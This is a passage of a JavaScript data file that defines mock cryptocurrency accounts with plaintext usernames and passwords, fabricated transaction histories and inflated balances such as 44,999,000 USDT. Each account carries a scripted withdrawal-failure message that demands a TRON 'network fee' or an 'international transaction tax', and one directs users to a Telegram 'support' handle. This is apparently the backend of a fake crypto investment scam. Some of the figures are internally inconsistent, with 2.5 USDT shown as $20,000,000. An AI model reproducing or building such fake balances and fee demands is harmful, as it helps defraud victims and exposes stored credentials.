      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'April 12, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7c...976F',
        status: 'Success',
        quantity: 0.23,
        amount_in_usd: 20000.0,
        assets: 'BTC'
      },
      {
        date: 'April 5, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q86...1199',
        status: 'Success',
        quantity: 0.29,
        amount_in_usd: 25000.0,
        assets: 'BTC'
      },
      {
        date: 'March 29, 2025',
        description: 'Transfer BTC',
        walletAddress: '3DD87...2148',
        status: 'Success',
        quantity: -0.41,
        amount_in_usd: -35000.0,
        assets: 'BTC'
      },
      {
        date: 'March 25, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q25...Ec30',
        status: 'Success',
        quantity: 1.17,
        amount_in_usd: 100000.0,
        assets: 'BTC'
      },
      {
        date: 'March 22, 2025',
        description: 'Deposit BTC',
        walletAddress: '1bDA5...197E',
        status: 'Success',
        quantity: 0.61,
        amount_in_usd: 52000.0,
        assets: 'BTC'
      },
      {
        date: 'March 18, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7d...AFB7',
        status: 'Success',
        quantity: 0.68,
        amount_in_usd: 58000.0,
        assets: 'BTC'
      },
      {
        date: 'March 14, 2025',
        description: 'Transfer BTC',
        walletAddress: '3FABB...694a',
        status: 'Success',
        quantity: -7.59,
        amount_in_usd: -650000.0,
        assets: 'BTC'
      },
      {
        date: 'March 12, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qaE...454C',
        status: 'Success',
        quantity: 8.17,
        amount_in_usd: 700000.0,
        assets: 'BTC'
      },
      {
        date: 'March 10, 2025',
        description: 'Transfer BTC',
        walletAddress: '17ee1...1e5a',
        status: 'Success',
        quantity: -0.85,
        amount_in_usd: -73000.0,
        assets: 'BTC'
      },
      {
        date: 'March 8, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q36...1E8f',
        status: 'Success',
        quantity: 8.87,
        amount_in_usd: 760000.0,
        assets: 'BTC'
      },
      {
        date: 'March 6, 2025',
        description: 'Deposit BTC',
        walletAddress: '39A60...9F8A',
        status: 'Success',
        quantity: 9.34,
        amount_in_usd: 800000.0,
        assets: 'BTC'
      },
      {
        date: 'March 5, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5e...f9A9',
        status: 'Success',
        quantity: 9.93,
        amount_in_usd: 850000.0,
        assets: 'BTC'
      },
      {
        date: 'March 3, 2025',
        description: 'Deposit BTC',
        walletAddress: '1Eaa8...ee7a',
        status: 'Success',
        quantity: 2.1,
        amount_in_usd: 180000.0,
        assets: 'BTC'
      },
      {
        date: 'March 2, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qqq...554F',
        status: 'Success',
        quantity: 1.11,
        amount_in_usd: 95000.0,
        assets: 'BTC'
      },
      {
        date: 'March 1, 2025',
        description: 'Deposit BTC',
        walletAddress: '3aA4f...B77a',
        status: 'Success',
        quantity: 4.09,
        amount_in_usd: 350000.0,
        assets: 'BTC'
      }
    ],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: '3LUNSXXoBjR9pLk1fshPVpg8NjQoSdeDkn',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 244.35
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC007',
    holder: {
      full_name: '',
      jointAccount: false,
      email: 'k*@gmail.com',
      username: 'Kim4robert',
      password: 'Robertkim12345'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg: 'You don’t have enough TRON to cover the network fee. Kindly top up your wallet to continue.',
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'August 21, 2025',
        description: 'Deposit USDT',
        walletAddress: '0xFh653****345dnj',
        status: 'Success',
        quantity: 999.73,
        isAssetUSDT: true,
        amount_in_usd: 1000.0,
        assets: 'USDT'
      },
      {
        date: 'August 21, 2025',
        description: 'Transfer USDT',
        walletAddress: '0x3md7h****sj874n',
        status: 'Success',
        quantity: 999.73,
        isAssetUSDT: true,
        amount_in_usd: -1000.0,
        assets: 'USDT'
      },
      {
        date: 'August 21, 2025',
        description: 'Transfer USDT',
        walletAddress: '0x2s6y3****366jsj',
        status: 'Success',
        quantity: 999.73,
        isAssetUSDT: true,
        amount_in_usd: -1000.0,
        assets: 'USDT'
      },
      {
        date: 'June 22, 2025',
        description: 'Deposit USDT',
        walletAddress: '0xFe98****123BcD',
        status: 'Success',
        quantity: 2.5,
        isAssetUSDT: true,
        amount_in_usd: 20000000.0,
        assets: 'USDT'
      },
      {
        date: 'June 21, 2025',
        description: 'Deposit USDT',
        walletAddress: '0xDc45****7890Ef',
        status: 'Success',
        quantity: 1.25,
        isAssetUSDT: true,
        amount_in_usd: 10000000.0,
        assets: 'USDT'
      },
      {
        date: 'June 20, 2025',
        description: 'Deposit USDT',
        walletAddress: '0xAa67****4567De',
        status: 'Success',
        quantity: 1.25,
        isAssetUSDT: true,
        amount_in_usd: 10000000.0,
        assets: 'USDT'
      },
      {
        date: 'June 19, 2025',
        description: 'Deposit USDT',
        walletAddress: '0xA7B9****890AbC',
        status: 'Success',
        quantity: 0.625,
        isAssetUSDT: true,
        amount_in_usd: 5000000.0,
        assets: 'USDT'
      }
    ],
    assets: [
      {
        assetsName: 'USDT',
        assetsName2: 'Tether',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/ozSbypA.png',
        quantity: 44999000.0
      },
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: '3LUNSXXoBjR9p******PVpg8NjQoSdeDkn',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 0
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC008',
    holder: {
      full_name: '',
      jointAccount: false,
      email: 'bellso***@gmail.com',
      username: 'ellebrooke1995',
      password: 'Ellebrook95'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'March 22, 2025',
        description: 'Deposit BTC',
        walletAddress: '1bDA5...197E',
        status: 'Success',
        quantity: 0.61,
        amount_in_usd: 52000.0,
        assets: 'BTC'
      },
      {
        date: 'March 18, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7d...AFB7',
        status: 'Success',
        quantity: 0.68,
        amount_in_usd: 58000.0,
        assets: 'BTC'
      },
      {
        date: 'March 14, 2025',
        description: 'Transfer BTC',
        walletAddress: '3FABB...694a',
        status: 'Success',
        quantity: -7.59,
        amount_in_usd: -650000.0,
        assets: 'BTC'
      },
      {
        date: 'February 26, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qxy7...4vn',
        status: 'Success',
        quantity: 9.27,
        amount_in_usd: 800000.0,
        assets: 'BTC'
      },
      {
        date: 'February 17, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9h2...k85',
        status: 'Success',
        quantity: 0.68,
        amount_in_usd: 58750.0,
        assets: 'BTC'
      },
      {
        date: 'February 05, 2025',
        description: 'Deposit BTC',
        walletAddress: '3J98t1...NLy',
        status: 'Success',
        quantity: 0.56,
        amount_in_usd: 48500.0,
        assets: 'BTC'
      },
      {
        date: 'January 29, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qar0...mdq',
        status: 'Success',
        quantity: 1.39,
        amount_in_usd: 120400.0,
        assets: 'BTC'
      },
      {
        date: 'January 14, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qc7s...tk9',
        status: 'Success',
        quantity: 0.91,
        amount_in_usd: 78300.0,
        assets: 'BTC'
      },
      {
        date: 'January 02, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4c0...hl7',
        status: 'Success',
        quantity: 0.59,
        amount_in_usd: 50600.0,
        assets: 'BTC'
      },
      {
        date: 'December 27, 2024',
        description: 'Deposit BTC',
        walletAddress: '1BoatS...pyT',
        status: 'Success',
        quantity: 0.96,
        amount_in_usd: 82900.0,
        assets: 'BTC'
      },
      {
        date: 'December 15, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5sh...8v2',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 40500.0,
        assets: 'BTC'
      },
      {
        date: 'December 01, 2024',
        description: 'Transfer BTC',
        walletAddress: 'bc1qkhc...zpw',
        status: 'Success',
        quantity: -24.4,
        amount_in_usd: -2100000.0,
        assets: 'BTC'
      },
      {
        date: 'November 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qmxd...h4k',
        status: 'Success',
        quantity: 2.72,
        amount_in_usd: 142000.0,
        assets: 'BTC'
      },
      {
        date: 'November 16, 2024',
        description: 'Deposit BTC',
        walletAddress: '3FZbgi...Zc5',
        status: 'Success',
        quantity: 0.83,
        amount_in_usd: 42300.0,
        assets: 'BTC'
      },
      {
        date: 'November 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q2x4...6v4',
        status: 'Success',
        quantity: 1.26,
        amount_in_usd: 63800.0,
        assets: 'BTC'
      },
      {
        date: 'October 25, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qr4d...fpx',
        status: 'Success',
        quantity: 1.88,
        amount_in_usd: 94700.0,
        assets: 'BTC'
      },
      {
        date: 'October 14, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qewe...nkj',
        status: 'Success',
        quantity: 0.95,
        amount_in_usd: 47100.0,
        assets: 'BTC'
      },
      {
        date: 'October 05, 2024',
        description: 'Deposit BTC',
        walletAddress: '1F1tAa...qX',
        status: 'Success',
        quantity: 1.37,
        amount_in_usd: 67500.0,
        assets: 'BTC'
      },
      {
        date: 'September 29, 2024',
        description: 'Transfer BTC',
        walletAddress: 'bc1qe5h...rgj',
        status: 'Success',
        quantity: -3.12,
        amount_in_usd: -152000.0,
        assets: 'BTC'
      },
      {
        date: 'September 18, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qj2s...nwk',
        status: 'Success',
        quantity: 1.24,
        amount_in_usd: 59800.0,
        assets: 'BTC'
      },
      {
        date: 'September 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qwqd...zej',
        status: 'Success',
        quantity: 0.013,
        amount_in_usd: 32100.0,
        assets: 'BTC'
      },
      {
        date: 'August 27, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1quka...faj',
        status: 'Success',
        quantity: 2.45,
        amount_in_usd: 116300.0,
        assets: 'BTC'
      },
      {
        date: 'August 16, 2024',
        description: 'Transfer BTC',
        walletAddress: 'bc1q42l...pcc',
        status: 'Success',
        quantity: -1.07,
        amount_in_usd: -50400.0,
        assets: 'BTC'
      },
      {
        date: 'August 05, 2024',
        description: 'Deposit BTC',
        walletAddress: '3P3QsM...rjt',
        status: 'Success',
        quantity: 0.78,
        amount_in_usd: 36500.0,
        assets: 'BTC'
      },
      {
        date: 'July 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9s0...h2z',
        status: 'Success',
        quantity: 1.76,
        amount_in_usd: 81900.0,
        assets: 'BTC'
      },
      {
        date: 'July 17, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qr29...n76',
        status: 'Success',
        quantity: 0.91,
        amount_in_usd: 42100.0,
        assets: 'BTC'
      },
      {
        date: 'July 06, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qtl0...fsm',
        status: 'Success',
        quantity: 1.35,
        amount_in_usd: 62200.0,
        assets: 'BTC'
      },
      {
        date: 'June 29, 2024',
        description: 'Transfer BTC',
        walletAddress: '1Mz715...BWX',
        status: 'Success',
        quantity: -2.34,
        amount_in_usd: -107600.0,
        assets: 'BTC'
      },
      {
        date: 'June 18, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qg3x...m7z',
        status: 'Success',
        quantity: 0.88,
        amount_in_usd: 40100.0,
        assets: 'BTC'
      },
      {
        date: 'June 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qv9m...cpj',
        status: 'Success',
        quantity: 1.17,
        amount_in_usd: 53300.0,
        assets: 'BTC'
      },
      {
        date: 'May 29, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qm34...s3h',
        status: 'Success',
        quantity: 3.05,
        amount_in_usd: 138200.0,
        assets: 'BTC'
      },
      {
        date: 'May 16, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qnjg...f9g',
        status: 'Success',
        quantity: 0.74,
        amount_in_usd: 33400.0,
        assets: 'BTC'
      },
      {
        date: 'May 05, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4u3...jty',
        status: 'Success',
        quantity: 1.29,
        amount_in_usd: 58100.0,
        assets: 'BTC'
      },
      {
        date: 'April 28, 2024',
        description: 'Transfer BTC',
        walletAddress: 'bc1qs62...0m3',
        status: 'Success',
        quantity: -1.92,
        amount_in_usd: -85600.0,
        assets: 'BTC'
      },
      {
        date: 'April 17, 2024',
        description: 'Deposit BTC',
        walletAddress: '3BbDtx...diQ',
        status: 'Success',
        quantity: 0.85,
        amount_in_usd: 37700.0,
        assets: 'BTC'
      },
      {
        date: 'April 06, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7gg...jr7',
        status: 'Success',
        quantity: 1.13,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'March 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qrp3...mv3',
        status: 'Success',
        quantity: 2.63,
        amount_in_usd: 115800.0,
        assets: 'BTC'
      },
      {
        date: 'March 17, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qcr8...fyu',
        status: 'Success',
        quantity: 0.96,
        amount_in_usd: 42100.0,
        assets: 'BTC'
      },
      {
        date: 'March 05, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5qy...970',
        status: 'Success',
        quantity: 1.42,
        amount_in_usd: 62000.0,
        assets: 'BTC'
      },
      {
        date: 'February 27, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qkn0...s4h',
        status: 'Success',
        quantity: 1.84,
        amount_in_usd: 79800.0,
        assets: 'BTC'
      },
      {
        date: 'February 16, 2024',
        description: 'Transfer BTC',
        walletAddress: '1BvBMS...VN2',
        status: 'Success',
        quantity: -0.71,
        amount_in_usd: -30700.0,
        assets: 'BTC'
      },
      {
        date: 'February 05, 2024',
        description: 'Transfer BTC',
        walletAddress: 'bc1qh9m...3dw',
        status: 'Success',
        quantity: -1.21,
        amount_in_usd: -52200.0,
        assets: 'BTC'
      },
      {
        date: 'January 29, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qxy2...wlh',
        status: 'Success',
        quantity: 2.17,
        amount_in_usd: 93000.0,
        assets: 'BTC'
      },
      {
        date: 'January 18, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qd4y...efd',
        status: 'Success',
        quantity: 0.82,
        amount_in_usd: 35000.0,
        assets: 'BTC'
      },
      {
        date: 'January 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9x3...4ew',
        status: 'Success',
        quantity: 1.09,
        amount_in_usd: 46300.0,
        assets: 'BTC'
      },
      {
        date: 'December 28, 2023',
        description: 'Transfer BTC',
        walletAddress: 'bc1q0sg...ldf',
        status: 'Success',
        quantity: -1.73,
        amount_in_usd: -72800.0,
        assets: 'BTC'
      },
      {
        date: 'December 17, 2023',
        description: 'Deposit BTC',
        walletAddress: '3Nxwen...p8v',
        status: 'Success',
        quantity: 0.68,
        amount_in_usd: 28500.0,
        assets: 'BTC'
      },
      {
        date: 'December 06, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q0d9...sq0',
        status: 'Success',
        quantity: 1.25,
        amount_in_usd: 52300.0,
        assets: 'BTC'
      },
      {
        date: 'November 29, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qc5z...vh4',
        status: 'Success',
        quantity: 1.97,
        amount_in_usd: 81900.0,
        assets: 'BTC'
      },
      {
        date: 'November 18, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qetu...kzm',
        status: 'Success',
        quantity: 0.89,
        amount_in_usd: 36900.0,
        assets: 'BTC'
      },
      {
        date: 'November 07, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qus3...jyk',
        status: 'Success',
        quantity: 1.33,
        amount_in_usd: 55000.0,
        assets: 'BTC'
      },
      {
        date: 'October 29, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qfj8...xqt',
        status: 'Success',
        quantity: 2.28,
        amount_in_usd: 93800.0,
        assets: 'BTC'
      },
      {
        date: 'October 18, 2023',
        description: 'Deposit BTC',
        walletAddress: '1NDyJt...u1s',
        status: 'Success',
        quantity: 0.75,
        amount_in_usd: 30700.0,
        assets: 'BTC'
      },
      {
        date: 'October 07, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7vw...h08',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 53600.0,
        assets: 'BTC'
      },
      {
        date: 'September 28, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qglk...4g3',
        status: 'Success',
        quantity: 1.62,
        amount_in_usd: 65800.0,
        assets: 'BTC'
      },
      {
        date: 'September 17, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4rd...7hj',
        status: 'Success',
        quantity: 0.93,
        amount_in_usd: 37600.0,
        assets: 'BTC'
      },
      {
        date: 'September 06, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5dz...h4m',
        status: 'Success',
        quantity: 1.15,
        amount_in_usd: 46500.0,
        assets: 'BTC'
      }
    ],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: 'bc1qnws8mz5ajmelhr77df7xfwr2z535chtvz3q7z2',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 1.07
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC009',
    holder: {
      full_name: '',
      dateCreated: '9/18/2025', // m/d/y
      jointAccount: false,
      email: 'j*@gmail.com',
      username: 'Jessica4christ',
      password: 'Carl4me$20'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg: "Withdrawal failed. You don't have enough TRON to cover the network fee. For assistance, please contact our support team via telegram: @ClientHelp247.",
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: 'bc1qnws8mz5aj******f7xfwrchtvz3q7z2',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 18.25
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  }
];
